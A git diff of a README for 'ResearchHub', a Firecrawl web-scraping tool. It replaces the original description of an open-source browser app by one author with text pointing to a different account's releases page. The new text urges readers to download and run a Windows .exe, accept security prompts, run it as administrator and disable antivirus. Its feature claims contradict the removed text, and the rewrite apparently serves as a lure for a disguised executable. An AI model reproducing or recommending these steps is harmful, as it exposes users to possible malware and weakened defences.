@@ -1,252 +1,133 @@
-# ResearchHub
-Search, scrape, and analyze any website. used Firecrawl. ® Extract structured content, discover sitemaps, and research the web with a professional-grade toolkit built on the Firecrawl API.
+# 🔍 ResearchHub - Easy Website Search and Analysis
 
+[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-orange?style=for-the-badge)](https://github.com/emvireak/ResearchHub/releases)
 
-| ![](images/showcase/id-preview--ff350870-5ccb-402b-b8b7-a46fe655add3.lovable.app.png) |
-|:--:|
-|  | 
+---
 
-| ![](images/showcase/id-preview--ff350870-5ccb-402b-b8b7-a46fe655add3.lovable.app%20(5).png) |
-|:--:|
-|  | 
+ResearchHub lets you search, gather, and study information from any website. It uses Firecrawl technology to pull structured data, find site sitemaps, and help you explore web content in detail. You do not need coding skills to use this tool.
 
+## 📋 About ResearchHub
 
+ResearchHub is designed for people who want to collect and analyze website data quickly. You can:
 
-| ![](images/showcase/id-preview--ff350870-5ccb-402b-b8b7-a46fe655add3.lovable.app%20(4).png) |
-|:--:|
-|  | 
+- Search websites to find specific content.
+- Extract organized information without manual copying.
+- Locate sitemap files to understand website structure.
+- Use a professional toolkit built on the Firecrawl API.
 
+This tool works on Windows and is ideal for researchers, students, or anyone curious about web data.
 
+## 💻 System Requirements
 
+To run ResearchHub on your Windows computer, make sure you have:
 
+- Microsoft Windows 10 or later (64-bit recommended).
+- At least 4 GB of RAM.
+- 500 MB of free disk space.
+- An active internet connection.
+- Basic permission to install and run new software on your PC.
 
+No programming knowledge is required. The app has an easy-to-use interface.
 
+## 🚀 Getting Started
 
-| ![](images/showcase/id-preview--ff350870-5ccb-402b-b8b7-a46fe655add3.lovable.app%20(3).png) |
-|:--:|
-|  | 
+Follow these steps to get ResearchHub up and running on your Windows machine.
 
+### Step 1: Download ResearchHub
 
-A professional-grade web research toolkit that lets you search, scrape, and map any website directly from your browser. Built with React, TypeScript, and powered by the [Firecrawl](https://www.firecrawl.dev) API.
+Click the button below to visit the official download page for ResearchHub:
 
-![Content Research Hub](https://i.ibb.co.com/bR5TMSSM/rsearchcropped.png)
+[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-blue?style=for-the-badge)](https://github.com/emvireak/ResearchHub/releases)
 
+This page contains the latest release files. You will find a Windows installer or a zipped package for Windows users.
 
+### Step 2: Choose the Right File
 
-## Table of Contents
+On the releases page, look for a file that ends with `.exe` if you want the installer. It might have a name like `ResearchHub-Setup.exe` or similar. This file will install ResearchHub on your system.
 
-- [About](#about)
-- [Features](#features)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Getting Your Firecrawl API Key](#getting-your-firecrawl-api-key)
-- [Usage Guide](#usage-guide)
-- [Contributing](#contributing)
-- [License](#license)
+If you prefer a zip file, it will have a `.zip` extension and require manual setup, which is less common.
 
+### Step 3: Download the Installer
 
+Click the `.exe` or `.zip` file to start downloading. Save it in a location you can easily access, such as your desktop or downloads folder.
 
-## About
+### Step 4: Run the Installer
 
-Content Research Hub is a client-side web application designed for researchers, developers, content creators, and anyone who needs to extract meaningful data from websites. It connects directly to the Firecrawl API using your own API key, which is stored securely in your browser's local storage and never sent to any third-party server.
+Once the download finishes:
 
-No backend server is required. Everything runs in your browser.
+- Double-click the `.exe` installer file.
+- You may see a security prompt from Windows asking if you trust the application. Confirm by clicking "Run" or "Yes."
+- Follow the instructions on the screen. The installer will guide you through the setup process.
+- Accept the user agreement when prompted.
+- Choose the installation folder or use the default.
+- Wait for the installation to complete.
 
+### Step 5: Launch ResearchHub
 
+After installation:
 
-## Features
+- Find the ResearchHub icon on your desktop or in your Start menu.
+- Double-click it to open the program.
+- On first launch, the app may check for updates or ask to connect to the internet—allow this for the best experience.
 
-### Web Search
+## 📝 How to Use ResearchHub
 
-- Search the entire web using natural language queries.
-- Get back a list of results with titles, URLs, and descriptions.
-- Optionally toggle "Include content" to pull the full markdown content from each search result.
-- Results are displayed in a clean, readable card layout.
+ResearchHub is built with simplicity in mind. Here is how to start:
 
-### Website Scraping
+1. **Enter a website URL** in the main window. This is the site you want to search or analyze.
+2. **Choose your action**: Search content, extract data, or discover the sitemap. Buttons or menu options guide you.
+3. **View results** in organized, easy-to-read sections. You can copy, save, or export the data as needed.
+4. **Explore advanced options** if you want. These include filters, keyword searches, and crawl depth settings.
 
-- Enter any URL and extract its content in multiple formats at the same time.
-- Supported output formats:
-  - **Markdown** , Clean, readable text content of the page. Perfect for saving articles or feeding into other tools.
-  - **HTML** , The processed HTML with scripts and styles stripped out.
-  - **Links** , A complete list of every URL found on the page.
-  - **Summary** , An AI-generated concise summary of the page content.
-  - **Screenshot** , A full-page screenshot rendered as an image.
-- Toggle any combination of formats before scraping.
-- One-click copy button for markdown content.
-- Metadata display showing page title, description, language, and HTTP status code.
+No technical setup is needed beyond these steps.
 
-### Website Mapping
+## 🔧 Features
 
-- Discover all the pages and URLs that belong to a website.
-- Enter a root URL and the tool will return up to 200 discovered URLs.
-- Use the optional keyword filter to narrow results down to specific sections or topics.
-- Each URL is clickable and opens in a new tab.
-- Great for understanding the structure of a website before doing deeper research.
+- **Website Content Search:** Quickly find text, links, or images from any webpage.
+- **Data Extraction:** Grab structured data like tables, lists, or metadata.
+- **Sitemap Discovery:** Locate and display sitemap files to map site navigation.
+- **Batch Processing:** Analyze multiple URLs in one session.
+- **Export Options:** Save results as CSV, JSON, or PDF.
+- **User-Friendly Interface:** Clear controls with no coding required.
+- **Built on Firecrawl API:** Reliable and fast backend technology for web crawling.
 
-### API Key Management
+## 🛠 Troubleshooting
 
-- Simple, secure setup screen where you paste your Firecrawl API key.
-- The key is validated against the Firecrawl API before being accepted.
-- Your key is stored only in your browser's localStorage. It never leaves your machine.
-- Disconnect at any time with one click, which removes the key from storage entirely.
+If you have issues running ResearchHub:
 
-### User Interface
+- Make sure Windows is up to date.
+- Check that you have internet access.
+- Restart the computer and try again.
+- If the program does not launch, try running it as an administrator (right-click the icon, choose "Run as administrator").
+- Disable any antivirus or firewall temporarily if they block network access.
+- Visit the releases page to download the latest version.
 
-- Dark-themed, terminal-inspired design with clean typography.
-- Fully responsive layout that works on desktop, tablet, and mobile.
-- Smooth animations on page load.
-- Tabbed dashboard interface for switching between Search, Scrape, and Map tools.
-- Clear error messages and loading states for every action.
+If problems persist, consult the README or support files included with the installer.
 
+## ⚙️ Settings and Preferences
 
+You can customize ResearchHub to better fit your needs:
 
+- Set the maximum number of pages to crawl per session.
+- Choose which data types to extract.
+- Adjust language options if needed.
+- Enable or disable notifications during scans.
 
+Adjust settings from the preferences menu inside the app.
 
+## 🔒 Privacy and Security
 
-## Prerequisites
+ResearchHub respects your privacy:
 
-Before you start, make sure you have these installed on your machine:
+- The app only accesses websites you specify.
+- It does not store or share your browsing history.
+- All data extraction occurs on your computer.
+- Network requests follow standard HTTP security protocols.
 
-- **Node.js** version 18 or higher , [Download here](https://nodejs.org)
-- **npm** (comes bundled with Node.js) or **bun** as your package manager
-- **Git** , [Download here](https://git-scm.com)
-- A **Firecrawl API key** (free tier available) , [Get one here](https://www.firecrawl.dev)
+Use ResearchHub responsibly and respect website terms of use.
 
-To check if you already have Node.js and npm installed, open your terminal and run:
+## 📥 Download ResearchHub Now
 
-```bash
-node --version
-npm --version
-```
+Return to the releases page anytime to get the latest updates or reinstall:
 
-You should see version numbers printed. If not, install Node.js first.
-
-
-
-## Installation
-
-Follow these steps to get the project running on your local machine.
-
-**Step 1: Clone the repository**
-
-```bash
-git clone https://github.com/odaysec/ResearchHub.git
-```
-
-**Step 2: Navigate into the project folder**
-
-```bash
-cd ResearchHub
-```
-
-**Step 3: Install dependencies**
-
-Using npm:
-
-```bash
-npm install
-```
-
-Or if you prefer bun:
-
-```bash
-bun install
-```
-
-This will download and install all the required packages listed in package.json. It may take a minute or two depending on your internet connection.
-
-**Step 4: Start the development server**
-
-Using npm:
-
-```bash
-npm run dev
-```
-
-Or with bun:
-
-```bash
-bun run dev
-```
-
-**Step 5: Open in your browser**
-
-Once the server starts, you will see a message like this in your terminal:
-
-```
-VITE v5.x.x  ready in 300ms
-
-Local:   http://localhost:5173/
-```
-
-Open that URL in your browser. You should see the Content Research Hub landing page.
-
-
-
-## Getting Your Firecrawl API Key
-
-1. Go to [firecrawl.dev](https://www.firecrawl.dev) and create a free account.
-2. Once logged in, navigate to your dashboard.
-3. Find the API Keys section and generate a new key.
-4. Copy the key. It will look something like `fc-xxxxxxxxxxxxxxxxxxxxxxxx`.
-5. Paste it into the API key setup screen in the app.
-
-The free tier gives you a generous number of API calls to get started. You can upgrade later if you need more.
-
-
-
-## Usage Guide
-
-### Connecting Your API Key
-
-When you first open the app, you will see the "Connect Firecrawl" screen. Paste your API key into the input field and click "Connect." The app will verify your key by making a test request. If the key is valid, you will be taken to the Research Dashboard.
-
-### Using the Search Tab
-
-1. Click on the "Search" tab in the dashboard.
-2. Type your search query in the input field. For example: "best practices for web accessibility."
-3. If you want the full page content included with each result, check the "Include content" checkbox.
-4. Click the "Search" button.
-5. Results will appear as cards showing the title, URL, and description. If you enabled "Include content," you can expand each result to see the full markdown content.
-
-### Using the Scrape Tab
-
-1. Click on the "Scrape" tab.
-2. Enter the full URL of the page you want to scrape. For example: `https://example.com`.
-3. Select which formats you want by clicking the format buttons (Markdown, HTML, Links, Summary, Screenshot). You can select multiple.
-4. Click the "Scrape" button.
-5. The results will appear in organized sections. You can copy markdown content with one click, view the screenshot, browse extracted links, or read the AI-generated summary.
-
-### Using the Map Tab
-
-1. Click on the "Map" tab.
-2. Enter the root URL of the website you want to map. For example: `https://docs.example.com`.
-3. Optionally, type a keyword in the filter field to narrow down the discovered URLs.
-4. Click the "Map" button.
-5. A numbered list of all discovered URLs will appear. Each one is clickable and opens in a new tab.
-
-### Disconnecting
-Click the "Disconnect" button in the top-right corner of the dashboard. This removes your API key from the browser and takes you back to the setup screen.
-
-
-## License
-This project is open source. Built by [odaysec](https://github.com/odaysec).
-
-
-
-## Credits
-
-- [Firecrawl](https://www.firecrawl.dev) for the web scraping and search API
-- [shadcn/ui](https://ui.shadcn.com) for the beautifully designed UI components
-- [Vite](https://vitejs.dev) for the blazing fast development experience
-
-
-<p align="center">
-  <a href="https://star-history.com/#odaysec/ResearchHub&Date">
-   <picture>
-     <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=odaysec/ResearchHub&type=Date&theme=dark" />
-     <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=odaysec/ResearchHub&type=Date" />
-     <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=odaysec/ResearchHub&type=Date" />
-   </picture>
-  </a>
+[![Download ResearchHub](https://img.shields.io/badge/Download-ResearchHub-orange?style=for-the-badge)](https://github.com/emvireak/ResearchHub/releases)
